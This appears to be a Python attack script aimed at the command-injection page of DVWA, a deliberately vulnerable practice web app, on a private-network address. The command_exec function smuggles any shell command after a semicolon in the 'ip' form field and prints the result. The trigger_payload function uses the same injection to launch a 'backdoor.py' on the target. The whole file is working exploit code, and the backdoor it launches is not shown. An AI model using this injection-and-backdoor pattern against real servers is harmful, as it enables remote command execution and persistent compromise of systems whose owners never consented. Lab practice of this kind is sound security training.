import requests
from pprint import pprint
from bs4 import BeautifulSoup
import pickle
ip='192.168.1.37'
headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "35",
    "Origin": f"http://{ip}",
    "Connection": "keep-alive",
    "Referer": f"{ip}/dvwa/vulnerabilities/exec/",
    "Upgrade-Insecure-Requests": "1",
    "Priority": "u=0, i",}
cookies={"security":"low", "PHPSESSID":"b49882121a18201c146c309cfcdabd6d"}

def command_exec(command:str):
    data={"username":"admin","password":"password","ip":f"192.168.1.1; {command}","submit":"submit"}
    rq=requests.post(f'http://{ip}/dvwa/vulnerabilities/exec/',headers=headers,data=data,cookies=cookies)
    soup=BeautifulSoup(rq.text,'html.parser')
    out=soup.find('pre')
    return out.string

def trigger_payload():
    data={"username":"admin","password":"password","ip":f"192.168.1.1; {'python backdoor.py'}","submit":"submit"}
    rq=requests.post(f'http://{ip}/dvwa/vulnerabilities/exec/',headers=headers,data=data,cookies=cookies)
    

